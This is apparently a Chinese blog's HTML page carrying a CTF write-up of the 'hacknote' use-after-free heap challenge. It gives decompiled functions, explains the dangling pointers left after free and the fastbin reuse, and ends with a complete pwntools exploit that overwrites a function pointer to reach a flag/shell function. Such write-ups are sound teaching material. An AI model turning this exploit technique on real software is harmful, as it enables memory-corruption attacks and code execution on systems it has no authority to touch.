@@ -1,0 +1,171 @@
+
+<!DOCTYPE html>
+<html lang="" class="loading">
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>use_after_free_kacknote - 知世の小屋</title>
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate">
+    <meta name="keywords" content="知世,"> 
+    <meta name="description" content="my blogs,
+use after free漏洞是heap里比较基础的漏洞,而这两道题就利用了这个漏洞
+
+代码分析main函数:123456789101112131415161718192021222324252,"> 
+    <meta name="author" content="知世"> 
+    <link rel="alternative" href="atom.xml" title="知世の小屋" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+    <link rel="stylesheet" href="/css/diaspora.css">
+    <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    <script>
+         (adsbygoogle = window.adsbygoogle || []).push({
+              google_ad_client: "ca-pub-8691406134231910",
+              enable_page_level_ads: true
+         });
+    </script>
+    <script async custom-element="amp-auto-ads" src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
+    </script>
+</head>
+</html>
+<body class="loading">
+    <span id="config-title" style="display:none">知世の小屋</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="icon-home image-icon" href="javascript:;" data-url="https://nightRainy.github.io"></a>
+    <div title="播放/暂停" class="icon-play"></div>
+    <h3 class="subtitle">use_after_free_kacknote</h3>
+    <div class="social">
+        <!--<div class="like-icon">-->
+            <!--<a href="javascript:;" class="likeThis active"><span class="icon-like"></span><span class="count">76</span></a>-->
+        <!--</div>-->
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class="main">
+        <h1 class="title">use_after_free_kacknote</h1>
+        <div class="stuff">
+            <span>四月 13, 2019</span>
+            
+
+        </div>
+        <div class="content markdown">
+            <blockquote>
+<p>use after free漏洞是heap里比较基础的漏洞,而这两道题就利用了这个漏洞</p>
+</blockquote>
+<h1 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h1><h2 id="main函数"><a href="#main函数" class="headerlink" title="main函数:"></a>main函数:</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">* int __cdecl __noreturn main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  int v3; // eax@2</span><br><span class="line">  char buf; // [sp+8h] [bp-10h]@2</span><br><span class="line">  int v5; // [sp+Ch] [bp-Ch]@1</span><br><span class="line"></span><br><span class="line">  v5 = *MK_FP(__GS__, 20);</span><br><span class="line">  setvbuf(stdout, 0, 2, 0);</span><br><span class="line">  setvbuf(stdin, 0, 2, 0);</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    while ( 1 )</span><br><span class="line">    &#123;</span><br><span class="line">      menu();</span><br><span class="line">      read(0, &amp;buf, 4u);</span><br><span class="line">      v3 = atoi(&amp;buf);</span><br><span class="line">      if ( v3 != 2 )</span><br><span class="line">        break;</span><br><span class="line">      del_note();</span><br><span class="line">    &#125;</span><br><span class="line">    if ( v3 &gt; 2 )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( v3 == 3 )</span><br><span class="line">      &#123;</span><br><span class="line">        print_note();</span><br><span class="line">      &#125;</span><br><span class="line">      else</span><br><span class="line">      &#123;</span><br><span class="line">        if ( v3 == 4 )</span><br><span class="line">          exit(0);</span><br><span class="line">LABEL_13:</span><br><span class="line">        puts(&quot;Invalid choice&quot;);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      if ( v3 != 1 )</span><br><span class="line">        goto LABEL_13;</span><br><span class="line">      add_note();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>main函数里有一些比较神奇的函数,一般从del类的函数中就可以考虑是不是存在use after free或者double free 的漏洞了,所以我们跟进函数看一下</p>
+<h2 id="del-note"><a href="#del-note" class="headerlink" title="del_note"></a>del_note</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">int del_note()</span><br><span class="line">&#123;</span><br><span class="line">  int v1; // [sp+4h] [bp-14h]@1</span><br><span class="line">  char buf; // [sp+8h] [bp-10h]@1</span><br><span class="line">  int v3; // [sp+Ch] [bp-Ch]@1</span><br><span class="line"></span><br><span class="line">  v3 = *MK_FP(__GS__, 20);</span><br><span class="line">  printf(&quot;Index :&quot;);</span><br><span class="line">  read(0, &amp;buf, 4u);</span><br><span class="line">  v1 = atoi(&amp;buf);</span><br><span class="line">  if ( v1 &lt; 0 || v1 &gt;= count )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Out of bound!&quot;);</span><br><span class="line">    _exit(0);</span><br><span class="line">  &#125;</span><br><span class="line">  if ( *(&amp;notelist + v1) )</span><br><span class="line">   &#123;</span><br><span class="line">    free(*((void **)*(&amp;notelist + v1) + 1));</span><br><span class="line">    free(*(&amp;notelist + v1));</span><br><span class="line">    puts(&quot;Success&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return *MK_FP(__GS__, 20) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到Del函数在free掉两个内存指针的时候并没有将两个指针置为NULL,这两个悬挂指针就可以作为uaf的触发点</p>
+<h2 id="add-note"><a href="#add-note" class="headerlink" title="add_note()"></a>add_note()</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">int add_note()</span><br><span class="line">&#123;</span><br><span class="line">  int v0; // ebx@8</span><br><span class="line">  signed int i; // [sp+Ch] [bp-1Ch]@3</span><br><span class="line">  int size; // [sp+10h] [bp-18h]@8</span><br><span class="line">  char buf; // [sp+14h] [bp-14h]@8</span><br><span class="line">  int v5; // [sp+1Ch] [bp-Ch]@1</span><br><span class="line"></span><br><span class="line">  v5 = *MK_FP(__GS__, 20);</span><br><span class="line">  if ( count &lt;= 5 )</span><br><span class="line">  &#123;</span><br><span class="line">    for ( i = 0; i &lt;= 4; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( !*(&amp;notelist + i) )</span><br><span class="line">      &#123;</span><br><span class="line">        *(&amp;notelist + i) = malloc(8u);</span><br><span class="line">        if ( !*(&amp;notelist + i) )</span><br><span class="line">        &#123;</span><br><span class="line">          puts(&quot;Alloca Error&quot;);</span><br><span class="line">          exit(-1);</span><br><span class="line">        &#125;</span><br><span class="line">        *(_DWORD *)*(&amp;notelist + i) = print_note_content;</span><br><span class="line">        printf(&quot;Note size :&quot;);</span><br><span class="line">        read(0, &amp;buf, 8u);</span><br><span class="line">        size = atoi(&amp;buf);</span><br><span class="line">        v0 = (int)*(&amp;notelist + i);</span><br><span class="line">        *(_DWORD *)(v0 + 4) = malloc(size);</span><br><span class="line">        if ( !*((_DWORD *)*(&amp;notelist + i) + 1) )</span><br><span class="line">        &#123;</span><br><span class="line">          puts(&quot;Alloca Error&quot;);</span><br><span class="line">          exit(-1);</span><br><span class="line">        &#125;</span><br><span class="line">        printf(&quot;Content :&quot;);</span><br><span class="line">        read(0, *((void **)*(&amp;notelist + i) + 1), size);</span><br><span class="line">        puts(&quot;Success !&quot;);</span><br><span class="line">        ++count;</span><br><span class="line">        return *MK_FP(__GS__, 20) ^ v5;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Full&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return *MK_FP(__GS__, 20) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>分析代码可以看出,add函数中我们最多可以新建五个note，而notelist的结构也可以看出是:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">put　：分配了有8u的内存</span><br><span class="line">content　：这个是看你输入内容是多少字节</span><br></pre></td></tr></table></figure>
+<h2 id="print-note"><a href="#print-note" class="headerlink" title="print_note()"></a>print_note()</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">int print_note()</span><br><span class="line">&#123;</span><br><span class="line">  int v1; // [sp+4h] [bp-14h]@1</span><br><span class="line">  char buf; // [sp+8h] [bp-10h]@1</span><br><span class="line">  int v3; // [sp+Ch] [bp-Ch]@1</span><br><span class="line"></span><br><span class="line">  v3 = *MK_FP(__GS__, 20);</span><br><span class="line">  printf(&quot;Index :&quot;);</span><br><span class="line">  read(0, &amp;buf, 4u);</span><br><span class="line">  v1 = atoi(&amp;buf);</span><br><span class="line">  if ( v1 &lt; 0 || v1 &gt;= count )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Out of bound!&quot;);</span><br><span class="line">    _exit(0);</span><br><span class="line">  &#125;</span><br><span class="line">  if ( *(&amp;notelist + v1) )</span><br><span class="line">    (*(void (__cdecl **)(_DWORD))*(&amp;notelist + v1))(*(&amp;notelist + v1));</span><br><span class="line">  return *MK_FP(__GS__, 20) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这个函数用来打印前面输入的content；</p>
+<h2 id="magic-函数："><a href="#magic-函数：" class="headerlink" title="magic()函数："></a>magic()函数：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">int magic()</span><br><span class="line">&#123;</span><br><span class="line">  return system(&quot;cat flag&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>“cat flag :”　这个不用多说</p>
+<p>那么利用思路就很明了了，利用uaf漏洞，让函数可以跳到magic函数就可以了．</p>
+<p>可以看到free后的chunk都是小于32个字节的，所以free后直接放入Ｆａｔｓbin中，而我们下一次分配同一字节数的chunk就可以完成了</p>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp:"></a>exp:</h2><p>exp如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh=process(&apos;./hacknote&apos;)</span><br><span class="line"></span><br><span class="line">def add(num):</span><br><span class="line">    sh.recvuntil(&quot;:&quot;)</span><br><span class="line">    sh.sendline(&quot;1&quot;)</span><br><span class="line">    sh.recvuntil(&quot;:&quot;)</span><br><span class="line">    if num==0:</span><br><span class="line">        sh.sendline(&quot;32&quot;)</span><br><span class="line">        sh.recvuntil(&quot;:&quot;)</span><br><span class="line">        sh.sendline(&quot;AAAA&quot;)</span><br><span class="line">    elif num==1:</span><br><span class="line">        sh.sendline(&quot;32&quot;)</span><br><span class="line">        sh.recvuntil(&quot;:&quot;)</span><br><span class="line">        sh.sendline(&quot;AABB&quot;)</span><br><span class="line">    else:</span><br><span class="line">        sh.sendline(&quot;8&quot;)</span><br><span class="line">        sh.recvuntil(&quot;:&quot;)</span><br><span class="line">        sh.sendline(p32(0x8048986))</span><br><span class="line"></span><br><span class="line">def dell(num):</span><br><span class="line">    sh.recvuntil(&quot;:&quot;)</span><br><span class="line">    sh.sendline(&quot;2&quot;)</span><br><span class="line">    sh.recvuntil(&quot;:&quot;)</span><br><span class="line">    sh.sendline(str(num))</span><br><span class="line"></span><br><span class="line">def prin():</span><br><span class="line">    sh.recvuntil(&quot;:&quot;)</span><br><span class="line">    sh.sendline(&quot;3&quot;)</span><br><span class="line">    sh.recvuntil(&quot;:&quot;)</span><br><span class="line">    sh.sendline(str(0))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(0)</span><br><span class="line">add(1)</span><br><span class="line">dell(0)</span><br><span class="line">dell(1)</span><br><span class="line">add(3)</span><br><span class="line">prin()</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure></p>
+<p>成功get shell!</p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        <li title="0" data-url="http://link.hhtjim.com/163/5146554.mp3"></li>
+                    
+                        <li title="1" data-url="http://link.hhtjim.com/qq/001faIUs4M2zna.mp3"></li>
+                    
+                </ul>
+            
+        </div>
+        
+    <div id="gitalk-container" class="comment link" data-ae="false" data-ci="" data-cs="" data-r="" data-o="" data-a="" data-d="false">查看评论</div>
+
+
+    </div>
+    
+</div>
+
+
+    </div>
+</div>
+</body>
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/diaspora.js"></script>
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+</html>
